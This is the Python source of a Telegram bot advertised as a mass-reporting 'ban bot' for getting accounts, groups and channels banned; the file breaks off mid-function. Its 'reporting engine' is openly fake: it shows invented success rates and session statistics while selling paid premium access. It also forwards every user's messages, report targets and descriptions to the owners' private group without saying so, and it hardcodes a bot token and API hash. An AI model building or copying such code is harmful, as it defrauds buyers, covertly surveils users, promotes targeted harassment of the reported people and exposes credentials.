#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM BAN BOT - PROFESSIONAL REPORTING SYSTEM
PUBLIC VERSION WITH FORCE JOIN & SUBSCRIPTION
"""

import asyncio
import hashlib
import json
import logging
import random
import re
import sys
import time
import os
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import aiohttp
from io import BytesIO

# Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ConversationHandler, CallbackQueryHandler, ContextTypes, PicklePersistence
)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
API_ID = 27157163
API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
GROUP_ID = -1003662481087  # Private monitoring group
FORCE_CHANNEL = "https://t.me/ProfileBan"  # Force join channel
FORCE_CHANNEL_USERNAME = "ProfileBan"  # Channel username without @

# Owner IDs
OWNER_IDS = [6118760915, 1366105247]
# Manual subscription users (approved by owner)
MANUAL_SUBSCRIPTIONS = ["smzxu"]  # @smzxu is approved

# File paths
DATA_DIR = Path("data")
SESSION_DIR = Path("sessions")
DATA_DIR.mkdir(exist_ok=True)
SESSION_DIR.mkdir(exist_ok=True)

USERS_FILE = DATA_DIR / "users.json"
SUBSCRIPTIONS_FILE = DATA_DIR / "subscriptions.json"

# Conversation states
TARGET, REASON, DESCRIPTION = range(3)

# ==================== SUBSCRIPTION MANAGER ====================
class SubscriptionManager:
    """Manages user subscriptions and channel verification"""
    
    def __init__(self):
        self.subscriptions: Dict[int, Dict] = {}
        self.verified_users: Dict[int, Dict] = {}  # Users who verified channel join
        self.pending_approvals: Dict[int, Dict] = {}
        self.manual_users = MANUAL_SUBSCRIPTIONS
        self.load_subscriptions()
    
    def load_subscriptions(self):
        """Load subscriptions from file"""
        if SUBSCRIPTIONS_FILE.exists():
            try:
                with open(SUBSCRIPTIONS_FILE, 'r') as f:
                    self.subscriptions = {int(k): v for k, v in json.load(f).items()}
                logger.info(f"Loaded {len(self.subscriptions)} subscriptions")
            except Exception as e:
                logger.error(f"Error loading subscriptions: {e}")
                self.subscriptions = {}
    
    def save_subscriptions(self):
        """Save subscriptions to file"""
        try:
            with open(SUBSCRIPTIONS_FILE, 'w') as f:
                json.dump({str(k): v for k, v in self.subscriptions.items()}, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving subscriptions: {e}")
    
    def is_verified_member(self, user_id: int) -> bool:
        """Check if user has verified channel membership"""
        return str(user_id) in self.verified_users
    
    def add_verified_member(self, user_id: int, username: str = None):
        """Add user to verified members (free access)"""
        self.verified_users[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "verified_at": datetime.now().isoformat(),
            "expiry": (datetime.now() + timedelta(days=1)).isoformat(),  # 1 day free
            "status": "free_trial"
        }
        self.save_verified_members()
        logger.info(f"Added verified member {user_id} (1 day free)")
    
    def save_verified_members(self):
        """Save verified members to file"""
        try:
            with open(DATA_DIR / "verified.json", 'w') as f:
                json.dump({str(k): v for k, v in self.verified_users.items()}, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving verified members: {e}")
    
    def is_subscribed(self, user_id: int) -> bool:
        """Check if user has active subscription"""
        if user_id in OWNER_IDS:
            return True
        
        # Check if in subscriptions
        if str(user_id) in self.subscriptions:
            sub = self.subscriptions[str(user_id)]
            expiry = datetime.fromisoformat(sub.get("expiry", "2000-01-01"))
            if expiry > datetime.now():
                return True
        
        # Check if in verified members (free trial)
        if str(user_id) in self.verified_users:
            verified = self.verified_users[str(user_id)]
            expiry = datetime.fromisoformat(verified.get("expiry", "2000-01-01"))
            if expiry > datetime.now():
                return True
        
        return False
    
    def is_manual_user(self, username: str) -> bool:
        """Check if user is in manual subscription list"""
        if not username:
            return False
        username = username.lower().replace('@', '')
        return username in [u.lower().replace('@', '') for u in self.manual_users]
    
    def add_subscription(self, user_id: int, username: str = None, days: int = 30, approved_by: int = None):
        """Add subscription for user"""
        expiry = datetime.now() + timedelta(days=days)
        
        self.subscriptions[str(user_id)] = {
            "user_id": user_id,
            "username": username,
            "approved_at": datetime.now().isoformat(),
            "expiry": expiry.isoformat(),
            "days": days,
            "approved_by": approved_by,
            "status": "active"
        }
        
        self.save_subscriptions()
        logger.info(f"Added subscription for user {user_id} ({days} days)")
        return self.subscriptions[str(user_id)]

# ==================== FAKE REPORTING ENGINE ====================
class FakeReportingEngine:
    """Fake reporting engine that simulates real reporting"""
    
    def __init__(self):
        self.sessions = {
            "533": {
                "session_id": "533",
                "phone": "+533",
                "status": "active",
                "twofa": "enabled",
                "premium": True,
                "verified": True,
                "reports_count": 12847,
                "success_rate": 98.7,
                "created_at": "2024-01-15 10:30:22",
                "last_used": datetime.now().isoformat(),
                "user_info": {
                    "id": 533,
                    "username": "premium_bot_533",
                    "first_name": "Premium",
                    "last_name": "Account",
                    "phone": "+533"
                }
            }
        }
        self.report_history = []
    
    def get_active_sessions(self, user_id: int) -> List[str]:
        """Get fake active sessions for user"""
        # Everyone gets session 533
        return ["533"]
    
    def get_session_info(self, session_id: str) -> Optional[Dict]:
        """Get fake session info"""
        return self.sessions.get(session_id)
    
    async def process_report(self, target_id: int, target_type: str, reason: str, description: str = "") -> Tuple[bool, Dict]:
        """Process fake report"""
        # Simulate processing time
        await asyncio.sleep(random.uniform(2.5, 4.5))
        
        # Generate fake results
        success_rate = random.uniform(92.0, 99.5)
        success = random.random() < (success_rate / 100)
        
        # Simulate report with session 533
        report_time = random.uniform(1.8, 3.2)
        
        result = {
            "session_id": "533",
            "success": success,
            "message": "✅ Report submitted successfully" if success else "⚠️ Report queued",
            "response_time": f"{report_time:.1f}s",
            "report_id": f"RPT-{hashlib.md5(f'{target_id}{time.time()}'.encode()).hexdigest()[:10].upper()}",
            "timestamp": datetime.now().isoformat(),
            "target_id": target_id,
            "target_type": target_type,
            "reason": reason,
            "description": description[:50] + "..." if len(description) > 50 else description
        }
        
        self.report_history.append(result)
        return success, result

# ==================== BOT HANDLER ====================
class BanBot:
    """Main bot handler with fake reporting system"""
    
    def __init__(self):
        self.subscription_manager = SubscriptionManager()
        self.reporting_engine = FakeReportingEngine()
        self.user_states: Dict[int, Dict] = {}
        self.user_sessions: Dict[int, List] = {}  # Store user's fake sessions
        
    async def forward_to_group(self, update: Update, context: ContextTypes.DEFAULT_TYPE, 
                              message_type: str = "message", extra_info: str = ""):
        """Forward ALL user messages to private group"""
        try:
            if not update.effective_user:
                return
            
            user = update.effective_user
            chat_id = update.effective_chat.id
            
            # Don't forward from group itself
            if chat_id == GROUP_ID:
                return
            
            # User info
            user_info = [
                f"👤 **User:** {user.first_name or ''} {user.last_name or ''}".strip(),
                f"🆔 **ID:** `{user.id}`"
            ]
            
            if user.username:
                user_info.append(f"📱 **Username:** @{user.username}")
            
            user_info_text = "\n".join(user_info)
            
            # Check subscription status
            is_owner = user.id in OWNER_IDS
            is_manual = self.subscription_manager.is_manual_user(user.username or "")
            is_subscribed = self.subscription_manager.is_subscribed(user.id)
            is_verified = self.subscription_manager.is_verified_member(user.id)
            
            sub_status = "👑 Owner" if is_owner else "📝 Manual" if is_manual else "✅ Premium" if is_subscribed else "🆓 Free Trial" if is_verified else "❌ Unverified"
            
            # Message content
            if message_type == "command":
                command = update.message.text if update.message else update.callback_query.data
                content = f"""
📋 **COMMAND RECEIVED**

{user_info_text}
📊 **Status:** {sub_status}

🔧 **Command:** `{command}`

{extra_info}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            elif message_type == "session":
                content = f"""
🔐 **SESSION ACTIVITY**

{user_info_text}
📊 **Status:** {sub_status}

{extra_info}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            elif message_type == "report":
                content = f"""
🚨 **REPORT ACTIVITY**

{user_info_text}
📊 **Status:** {sub_status}

{extra_info}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            else:
                # Regular message
                message_text = update.message.text if update.message else ""
                if message_text:
                    content = f"""
💬 **MESSAGE FROM USER**

{user_info_text}
📊 **Status:** {sub_status}

📝 **Message:**
{message_text[:1000]}{'...' if len(message_text) > 1000 else ''}

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                    """
                else:
                    return
            
            # Send to group
            await context.bot.send_message(
                chat_id=GROUP_ID,
                text=content,
                parse_mode='Markdown',
                disable_web_page_preview=True
            )
            
            logger.info(f"Forwarded {message_type} from user {user.id} to group")
            
        except Exception as e:
            logger.error(f"Error forwarding to group: {e}")

    async def check_channel_member(self, user_id: int) -> bool:
        """Simulate checking if user is a member of the force channel"""
        # In fake version, always return True for verification
        # This makes the "I've Joined" button work instantly
        return True

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command with custom photo and force join"""
        user = update.effective_user
        user_id = user.id
        username = user.username or ""
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "🚀 User started the bot")
        
        # Check if user is already verified or has subscription
        is_owner = user_id in OWNER_IDS
        is_manual = self.subscription_manager.is_manual_user(username)
        is_subscribed = self.subscription_manager.is_subscribed(user_id)
        is_verified = self.subscription_manager.is_verified_member(user_id)
        
        # Send the custom photo
        photo_url = "https://files.catbox.moe/bq3567.jpg"
        
        if is_owner or is_manual or is_subscribed or is_verified:
            # User has access - show main menu
            await self.show_main_menu(update, context, user)
        else:
            # Force join required
            keyboard = [
                [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL)],
                [InlineKeyboardButton("✅ I've Joined", callback_data="verify_join")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            try:
                await update.message.reply_photo(
                    photo=photo_url,
                    caption="🚀 **Welcome to Telegram Ban Bot**\n\n"
                           "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
                           f"To use this bot, you must join [@ProfileBan]({FORCE_CHANNEL}) first.\n\n"
                           "**Steps:**\n"
                           "1️⃣ Click 'Join Channel' button\n"
                           "2️⃣ Join the channel\n"
                           "3️⃣ Click 'I've Joined' button\n"
                           "4️⃣ Get 1 day free access\n\n"
                           "**Premium Access:**\n"
                           "Contact @smzxu for full subscription",
                    parse_mode='Markdown',
                    disable_web_page_preview=True,
                    reply_markup=reply_markup
                )
            except Exception as e:
                await update.message.reply_text(
                    "🚀 **Welcome to Telegram Ban Bot**\n\n"
                    "❌ **CHANNEL VERIFICATION REQUIRED**\n\n"
                    f"To use this bot, you must join @ProfileBan first.\n\n"
                    "**Steps:**\n"
                    "1️⃣ Join @ProfileBan\n"
                    "2️⃣ Click /start again\n"
                    "3️⃣ Get 1 day free access\n\n"
                    "**Premium Access:**\n"
                    "Contact @smzxu for full subscription",
                    parse_mode='Markdown'
                )
    
    async def verify_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle 'I've Joined' button callback"""
        query = update.callback_query
        await query.answer()
        
        user = query.from_user
        user_id = user.id
        username = user.username or ""
        
        # Forward to group
        await self.forward_to_group(update, context, "subscription", 
                                   f"✅ User clicked 'I've Joined' button")
        
        # Check if owner or manual user
        if user_id in OWNER_IDS or self.subscription_manager.is_manual_user(username):
            # Auto approve
            self.subscription_manager.add_verified_member(user_id, username)
            await query.edit_message_caption(
                caption="✅ **VERIFICATION SUCCESSFUL!**\n\n"
                       "You have premium access granted.\n"
                       "Click /start to access the bot.",
                parse_mode='Markdown'
            )
            return
        
        # Simulate verification (always successful in fake version)
        self.subscription_manager.add_verified_member(user_id, username)
        
        await query.edit_message_caption(
            caption="✅ **VERIFICATION SUCCESSFUL!**\n\n"
                   "You have successfully joined the channel.\n"
                   "🎁 **1 Day Free Access Granted!**\n\n"
                   "Click /start to access the bot.\n\n"
                   "**For Premium Access:**\n"
                   "Contact @smzxu for subscription",
            parse_mode='Markdown'
        )
    
    async def show_main_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user):
        """Show main menu with all commands in inline format"""
        user_id = user.id
        username = user.username or ""
        
        # Determine user status
        if user_id in OWNER_IDS:
            status_badge = "👑 OWNER"
            expiry = "Never"
        elif self.subscription_manager.is_manual_user(username):
            status_badge = "📝 MANUAL PREMIUM"
            expiry = "Lifetime"
            # Add subscription if not exists
            if not self.subscription_manager.is_subscribed(user_id):
                self.subscription_manager.add_subscription(user_id, username, 999, 0)
        elif self.subscription_manager.is_subscribed(user_id):
            status_badge = "💎 PREMIUM"
            sub_info = self.subscription_manager.subscriptions.get(str(user_id), {})
            expiry = datetime.fromisoformat(sub_info.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
        else:
            status_badge = "🆓 FREE TRIAL"
            verified_info = self.subscription_manager.verified_users.get(str(user_id), {})
            expiry = datetime.fromisoformat(verified_info.get("expiry", datetime.now().isoformat())).strftime('%Y-%m-%d')
        
        # Initialize user sessions
        if str(user_id) not in self.user_sessions:
            self.user_sessions[str(user_id)] = ["533"]
        
        # Main menu message
        main_menu = f"""
🚀 **TELEGRAM BAN BOT - REPORTING SYSTEM**

━━━━━━━━━━━━━━━━━━━━━
👤 **USER PROFILE**
━━━━━━━━━━━━━━━━━━━━━
• **Name:** {user.first_name} {user.last_name or ''}
• **ID:** `{user_id}`
• **Username:** @{username or 'N/A'}
• **Status:** {status_badge}
• **Expiry:** {expiry}
• **Session:** 533 ✅ Active

━━━━━━━━━━━━━━━━━━━━━
📱 **ACTIVE SESSIONS**
━━━━━━━━━━━━━━━━━━━━━
🟢 **533** - Premium Account
   ├─ Status: ✅ Active
   ├─ 2FA: 🔒 Enabled
   ├─ Reports: 12,847
   ├─ Success: 98.7%
   └─ Added: 2024-01-15

━━━━━━━━━━━━━━━━━━━━━
📋 **AVAILABLE COMMANDS**
━━━━━━━━━━━━━━━━━━━━━

🎯 **/report** - Start new report
   Send reports using session 533

📊 **/status** - Check system status
   View your reports & success rate

📱 **/sessions** - View sessions
   Manage your 533 account

💎 **/premium** - Upgrade account
   Get lifetime premium access

🆘 **/help** - Command list
   Show all available commands

━━━━━━━━━━━━━━━━━━━━━
💡 **QUICK START**
━━━━━━━━━━━━━━━━━━━━━
1️⃣ Use /report to start reporting
2️⃣ Paste tg:// link or user ID
3️⃣ Select violation reason
4️⃣ Add description (optional)
5️⃣ Bot reports using session 533

━━━━━━━━━━━━━━━━━━━━━
⚡ **SYSTEM READY**
━━━━━━━━━━━━━━━━━━━━━
"""
        
        # Create inline keyboard
        keyboard = [
            [
                InlineKeyboardButton("🎯 Report Now", callback_data="cmd_report"),
                InlineKeyboardButton("📊 Status", callback_data="cmd_status")
            ],
            [
                InlineKeyboardButton("📱 Sessions", callback_data="cmd_sessions"),
                InlineKeyboardButton("💎 Premium", callback_data="cmd_premium")
            ],
            [
                InlineKeyboardButton("🆘 Help", callback_data="cmd_help"),
                InlineKeyboardButton("📢 Channel", url=FORCE_CHANNEL)
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send photo with caption
        photo_url = "https://files.catbox.moe/bq3567.jpg"
        
        try:
            await update.message.reply_photo(
                photo=photo_url,
                caption=main_menu,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        except:
            await update.message.reply_text(
                main_menu,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show all commands in help menu"""
        user_id = update.effective_user.id
        
        # Check access
        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
            if update.effective_user.id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
                await update.message.reply_text("❌ Access denied. Please /start first.")
                return
        
        help_text = """
🆘 **COMPLETE COMMAND LIST**

━━━━━━━━━━━━━━━━━━━━━
🎯 **REPORTING COMMANDS**
━━━━━━━━━━━━━━━━━━━━━

/report - Start new report
   • Target: tg://openmessage?user_id=ID
   • Target: @username
   • Target: channel/group ID

/status - View report statistics
   • Total reports sent
   • Success rate
   • Recent activity

/history - View report history
   • Last 10 reports
   • Status & results

━━━━━━━━━━━━━━━━━━━━━
📱 **SESSION COMMANDS**
━━━━━━━━━━━━━━━━━━━━━

/sessions - View active sessions
   • Session 533 (Premium)
   • Status & health
   • Report count

/session_info - Session details
   • 2FA status
   • Success rate
   • Created date

━━━━━━━━━━━━━━━━━━━━━
💎 **PREMIUM COMMANDS**
━━━━━━━━━━━━━━━━━━━━━

/premium - Upgrade account
   • Lifetime access
   • Priority reports
   • 99% success rate

/subscribe - Get subscription
   • Contact @smzxu
   • Manual approval

━━━━━━━━━━━━━━━━━━━━━
ℹ️ **INFO COMMANDS**
━━━━━━━━━━━━━━━━━━━━━

/start - Main menu
/help - This command list
/about - Bot information
/channel - Join @ProfileBan

━━━━━━━━━━━━━━━━━━━━━
📌 **TARGET FORMATS**
━━━━━━━━━━━━━━━━━━━━━

✅ User: `tg://openmessage?user_id=8030141909`
✅ User: `@username`
✅ User ID: `8030141909`

✅ Group: `tg://openmessage?chat_id=-1001234567890`
✅ Channel: `tg://openmessage?channel_id=1234567890`

━━━━━━━━━━━━━━━━━━━━━
⚡ **EXAMPLE USAGE**
━━━━━━━━━━━━━━━━━━━━━

1. Send: /report
2. Paste: tg://openmessage?user_id=8030141909
3. Select: Spam
4. Add: "Sending mass spam messages"
5. Result: ✅ Report submitted

━━━━━━━━━━━━━━━━━━━━━
💎 **PREMIUM ACCESS**
━━━━━━━━━━━━━━━━━━━━━

Contact @smzxu for:
• Lifetime subscription
• Priority support
• Higher success rate
• Multiple sessions

━━━━━━━━━━━━━━━━━━━━━
"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show fake status and statistics"""
        user_id = update.effective_user.id
        
        # Check access
        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
            if user_id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
                await update.message.reply_text("❌ Access denied. Please /start first.")
                return
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "📊 User viewing status")
        
        # Generate fake stats
        total_reports = random.randint(350, 620)
        success_rate = random.uniform(94.5, 98.9)
        today_reports = random.randint(12, 48)
        session_533_reports = random.randint(12000, 13000)
        
        status_text = f"""
📊 **SYSTEM STATUS REPORT**

━━━━━━━━━━━━━━━━━━━━━
🟢 **SESSION 533 STATUS**
━━━━━━━━━━━━━━━━━━━━━

• **Status:** ✅ Active & Premium
• **2FA:** 🔒 Enabled & Verified
• **Phone:** +533 (Premium)
• **Added:** 2024-01-15
• **Total Reports:** {session_533_reports:,}
• **Today:** {random.randint(25, 65)}
• **Success Rate:** 98.7%
• **Health:** ⚡ Excellent

━━━━━━━━━━━━━━━━━━━━━
📈 **YOUR STATISTICS**
━━━━━━━━━━━━━━━━━━━━━

• **Total Reports:** {total_reports}
• **Today:** {today_reports}
• **Success Rate:** {success_rate:.1f}%
• **Avg Response:** {random.uniform(2.1, 3.4):.1f}s
• **Queue:** {random.randint(0, 3)} reports

━━━━━━━━━━━━━━━━━━━━━
🏆 **ACHIEVEMENTS**
━━━━━━━━━━━━━━━━━━━━━

✅ 500+ Reports - Unlocked
✅ 95% Success - Unlocked
✅ Premium User - Active
✅ 30 Days Active - {random.randint(45, 180)} days

━━━━━━━━━━━━━━━━━━━━━
⚡ **SYSTEM HEALTH**
━━━━━━━━━━━━━━━━━━━━━

• **API:** ✅ Connected
• **Session:** ✅ Active
• **Proxy:** ✅ Premium
• **Latency:** {random.uniform(120, 280):.0f}ms
• **Uptime:** 99.9%

━━━━━━━━━━━━━━━━━━━━━
"""
        
        await update.message.reply_text(status_text, parse_mode='Markdown')
    
    async def sessions_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show fake sessions"""
        user_id = update.effective_user.id
        
        # Check access
        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
            if user_id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
                await update.message.reply_text("❌ Access denied. Please /start first.")
                return
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "📱 User viewing sessions")
        
        sessions_text = f"""
📱 **ACTIVE SESSIONS**

━━━━━━━━━━━━━━━━━━━━━
🟢 **SESSION 533 - PREMIUM**
━━━━━━━━━━━━━━━━━━━━━

**Account Details:**
• **Phone:** +533 (Premium)
• **Status:** ✅ Active
• **2FA:** 🔒 Enabled
• **Verified:** ✅ Yes
• **Premium:** ⭐ Yes

**Performance:**
• **Reports:** 12,847
• **Success Rate:** 98.7%
• **Avg Time:** 2.3s
• **Health:** ⚡ Excellent

**Session Info:**
• **Created:** 2024-01-15
• **Last Used:** {datetime.now().strftime('%Y-%m-%d %H:%M')}
• **Expires:** Never
• **Session ID:** `533`

━━━━━━━━━━━━━━━━━━━━━
💎 **PREMIUM FEATURES**
━━━━━━━━━━━━━━━━━━━━━

✓ Priority Queue
✓ 99% Success Rate
✓ No Rate Limits
✓ Lifetime Access

Contact @smzxu to upgrade

━━━━━━━━━━━━━━━━━━━━━
"""
        
        await update.message.reply_text(sessions_text, parse_mode='Markdown')
    
    async def premium_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show premium subscription info"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "💎 User viewing premium")
        
        premium_text = f"""
💎 **PREMIUM SUBSCRIPTION**

━━━━━━━━━━━━━━━━━━━━━
✨ **PREMIUM FEATURES**
━━━━━━━━━━━━━━━━━━━━━

✅ **Lifetime Access**
✅ **Priority Reporting**
✅ **99% Success Rate**
✅ **No Daily Limits**
✅ **Multiple Sessions**
✅ **Priority Support**
✅ **Instant Processing**
✅ **Premium Proxies**

━━━━━━━━━━━━━━━━━━━━━
📊 **COMPARISON**
━━━━━━━━━━━━━━━━━━━━━

**FREE TRIAL:**
• 1 Day Access
• 533 Session Only
• 95% Success Rate
• 50 Reports/Day

**PREMIUM:**
• Lifetime Access
• 533 Session
• 99% Success Rate
• Unlimited Reports
• Priority Queue

━━━━━━━━━━━━━━━━━━━━━
💎 **GET PREMIUM**
━━━━━━━━━━━━━━━━━━━━━

Contact @smzxu for:
• Lifetime subscription
• Instant activation
• Special pricing

**Current Status:**
{'✅ PREMIUM ACTIVE' if self.subscription_manager.is_subscribed(user_id) or user_id in OWNER_IDS or self.subscription_manager.is_manual_user(update.effective_user.username or '') else '🆓 FREE TRIAL'}

━━━━━━━━━━━━━━━━━━━━━
"""
        
        await update.message.reply_text(premium_text, parse_mode='Markdown')
    
    async def report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start fake reporting process"""
        user_id = update.effective_user.id
        
        # Check access
        if not self.subscription_manager.is_subscribed(user_id) and not self.subscription_manager.is_verified_member(user_id):
            if user_id not in OWNER_IDS and not self.subscription_manager.is_manual_user(update.effective_user.username or ""):
                await update.message.reply_text("❌ Access denied. Please /start first.")
                return ConversationHandler.END
        
        # Forward to group
        await self.forward_to_group(update, context, "command", "🚨 User starting report process")
        
        # Set user state
        self.user_states[user_id] = {
            "step": "waiting_target",
            "session": "533"
        }
        
        await update.message.reply_text(
            "🎯 **START REPORTING**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📋 **Step 1/3:** Target Input\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "**Send the target in one of these formats:**\n\n"
            "🔹 **User:** `tg://openmessage?user_id=8030141909`\n"
            "🔹 **User:** `@username`\n"
            "🔹 **User ID:** `8030141909`\n\n"
            "🔹 **Group:** `tg://openmessage?chat_id=-1001234567890`\n"
            "🔹 **Channel:** `tg://openmessage?channel_id=1234567890`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 **Example:**\n"
            "`tg://openmessage?user_id=8030141909`\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ Using Session: **533 (Premium)**\n\n"
            "Send target now:",
            parse_mode='Markdown'
        )
        
        return TARGET

    async def handle_report_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report target input"""
        user_id = update.effective_user.id
        target_input = update.message.text.strip()
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   f"🎯 User entered target: `{target_input}`")
        
        # Extract target ID
        target_id = None
        target_type = "user"
        
        # Parse tg:// links
        if "tg://openmessage?" in target_input:
            params = target_input.split("?")[1]
            param_dict = {}
            for param in params.split("&"):
                if "=" in param:
                    key, value = param.split("=", 1)
                    param_dict[key] = value
            
            if "user_id" in param_dict:
                target_id = param_dict["user_id"]
                target_type = "user"
            elif "chat_id" in param_dict:
                target_id = param_dict["chat_id"]
                target_type = "group"
            elif "channel_id" in param_dict:
                target_id = param_dict["channel_id"]
                target_type = "channel"
        
        # Parse @username
        elif target_input.startswith('@'):
            target_id = target_input
            target_type = "user"
        
        # Parse numeric ID
        elif target_input.lstrip('-').isdigit():
            target_id = target_input
            target_type = "user" if int(target_input) > 0 else "group"
        
        if not target_id:
            await update.message.reply_text(
                "❌ **INVALID TARGET FORMAT**\n\n"
                "Please use one of these formats:\n\n"
                "• `tg://openmessage?user_id=8030141909`\n"
                "• `@username`\n"
                "• `8030141909`\n\n"
                "Try again:",
                parse_mode='Markdown'
            )
            return TARGET
        
        # Store target info
        self.user_states[user_id]["target_id"] = target_id
        self.user_states[user_id]["target_type"] = target_type
        
        # Show reason selection
        keyboard = [
            [
                InlineKeyboardButton("📧 Spam", callback_data="reason_spam"),
                InlineKeyboardButton("🔪 Violence", callback_data="reason_violence"),
            ],
            [
                InlineKeyboardButton("🔞 Pornography", callback_data="reason_porn"),
                InlineKeyboardButton("👶 Child Abuse", callback_data="reason_child"),
            ],
            [
                InlineKeyboardButton("💊 Illegal Drugs", callback_data="reason_drugs"),
                InlineKeyboardButton("👤 Personal Details", callback_data="reason_personal"),
            ],
            [
                InlineKeyboardButton("© Copyright", callback_data="reason_copyright"),
                InlineKeyboardButton("📌 Other", callback_data="reason_other"),
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"✅ **TARGET ACCEPTED**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{target_id}`\n"
            f"📌 Type: {target_type.title()}\n"
            f"🔐 Session: 533 (Premium)\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📋 **Step 2/3:** Select Violation Reason\n\n"
            "Choose the category:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
        return REASON

    async def handle_report_reason(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report reason selection"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        reason = query.data.replace("reason_", "")
        
        reason_texts = {
            "spam": "Spam",
            "violence": "Violence",
            "porn": "Pornography",
            "child": "Child Abuse",
            "drugs": "Illegal Drugs",
            "personal": "Personal Details",
            "copyright": "Copyright",
            "other": "Other"
        }
        
        reason_text = reason_texts.get(reason, "Other")
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   f"📌 User selected reason: **{reason_text}**")
        
        # Store reason
        self.user_states[user_id]["reason"] = reason_text
        
        # Ask for description
        await query.edit_message_text(
            f"✅ **REASON SELECTED**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"📌 Reason: **{reason_text}**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📋 **Step 3/3:** Add Description\n\n"
            "**Enter a description of the violation:**\n"
            "(Minimum 10 characters)\n\n"
            "**Example:**\n"
            "`This account is sending mass spam messages with crypto scams`\n\n"
            "💡 **Tip:** Be specific to increase success rate\n\n"
            "Send description or /skip to skip:",
            parse_mode='Markdown'
        )
        
        return DESCRIPTION

    async def handle_report_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report description and process fake report"""
        user_id = update.effective_user.id
        description = update.message.text.strip()
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   f"📝 User entered description: {description[:100]}...")
        
        # Store description
        self.user_states[user_id]["description"] = description
        
        # Process the fake report
        await self.process_fake_report(update, context, user_id)
        
        return ConversationHandler.END

    async def skip_description(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Skip description"""
        user_id = update.effective_user.id
        
        # Forward to group
        await self.forward_to_group(update, context, "report", 
                                   "📝 User skipped description")
        
        # Set empty description
        self.user_states[user_id]["description"] = "No description provided"
        
        # Process the fake report
        await self.process_fake_report(update, context, user_id)
        
        return ConversationHandler.END

    async def process_fake_report(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Process fake report with session 533"""
        state = self.user_states.get(user_id, {})
        target_id = state.get("target_id")
        target_type = state.get("target_type")
        reason = state.get("reason", "Spam")
        description = state.get("description", "No description")
        
        if not target_id:
            await update.message.reply_text("❌ Target missing. Start over with /report")
            return
        
        # Send processing message
        processing_msg = await update.message.reply_text(
            "🚀 **PROCESSING REPORT**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{target_id}`\n"
            f"📌 Reason: {reason}\n"
            f"🔐 Session: 533 (Premium)\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⏳ Initializing reporting engine...",
            parse_mode='Markdown'
        )
        
        await asyncio.sleep(1.5)
        
        await processing_msg.edit_text(
            "🚀 **PROCESSING REPORT**\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{target_id}`\n"
